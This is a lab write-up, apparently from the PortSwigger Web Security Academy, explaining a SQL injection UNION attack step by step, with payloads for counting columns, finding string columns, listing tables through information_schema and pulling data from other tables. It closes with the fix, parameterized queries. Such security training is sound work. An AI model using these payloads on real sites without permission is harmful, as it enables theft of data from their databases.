# SQL Injection: Pulling Data from Other Tables with a UNION Attack

**Lab:** SQL injection UNION attack
**Status:** Solved ✅

---

## What this lab's testing

This one moves past just breaking a query and into actually pulling data you shouldn't have access to. The app shows products filtered by category, and the underlying query looks something like:

```sql
SELECT name, description
FROM products
WHERE category = 'Gifts'
```

Because `category` isn't sanitized, we can inject a `UNION SELECT` onto the end of it and get the database to hand back rows from a completely different table — stitched right into the normal product listing.

**Goal:** use a UNION injection to pull data out of another table in the database.

## Quick refresher on how UNION works

`UNION` just glues the results of two `SELECT` statements together:

```sql
SELECT name FROM products
UNION
SELECT username FROM users
```

As long as both queries return the same number of columns, with compatible types, the database will happily combine them into one result set. That's the whole trick — get our own `SELECT` to ride along with the app's.

A typical injection looks like:

```
' UNION SELECT column1,column2--
```

The leading `'` closes off the string the app was building, `UNION SELECT` bolts on our query, and `--` comments out whatever was supposed to come after in the original statement.

## Working through it

**1. Find the injectable parameter**

Browse the shop, click into a category, and grab the request in Burp. You'll see something like:

```
category=Gifts
```

That's the parameter we're going after.

**2. Send it to Repeater**

Move the request over so we can iterate on payloads without re-browsing every time.

**3. Figure out how many columns we're dealing with**

Before a UNION injection will work, the injected query has to match the column count of the original one. The easiest way to find that number is with `ORDER BY`:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Keep bumping the number up until the app throws an error. Whatever the last working number was — that's your column count.

**4. Work out which columns take strings**

Not every column will accept text data, so test that next:

```
' UNION SELECT 'a',NULL--
```

If that errors out, try shuffling the position:

```
' UNION SELECT NULL,'a'--
```

Whichever combination the app accepts without complaint tells you which slots you can use to smuggle string data back out.

**5. Confirm the UNION actually lands**

Once you know the column count and which ones take strings, send something you can visually confirm in the response:

```
' UNION SELECT NULL,'test'--
```

The query is now effectively:

```sql
SELECT name, description
FROM products
WHERE category = 'Gifts'

UNION

SELECT NULL, 'test'
```

If `test` shows up somewhere in the page, you've got a working UNION injection.

**6. Start digging into the database itself**

With a confirmed injection point, you can start querying the database's own metadata to map out what's there. On databases that support `information_schema`, something like this will list table names:

```sql
SELECT table_name
FROM information_schema.tables
```

(The exact syntax varies a bit depending on which DB engine is behind the scenes.)

**7. Grab the actual target data**

Once you've spotted an interesting table and worked out its columns, just slot it into the same UNION pattern:

```sql
SELECT column1, column2
FROM target_table
```

Whatever comes back gets rendered right there in the app's normal response — which is really the whole point of this attack. The vulnerability doesn't just let you break things, it lets you exfiltrate data from anywhere in the database, one query at a time.

## Tools used

- Burp Suite (Proxy + Repeater)
- Browser

## Takeaways

- SQL injection isn't limited to the table the query was originally written against — UNION lets you reach into anything the DB user can read.
- Before a UNION injection works, you need to nail down the column count and matching data types first — skip this and every payload just errors out.
- `ORDER BY` is a clean, low-noise way to enumerate columns without needing a working UNION yet.
- Metadata tables like `information_schema.tables` turn a working injection into a full map of the database.
- Same fix as always: parameterized queries. No amount of input filtering beats just not building SQL out of string concatenation in the first place.

---

*Solved as part of the PortSwigger Web Security Academy — for learning/authorized testing only. Don't run this against anything you don't have permission to test.*
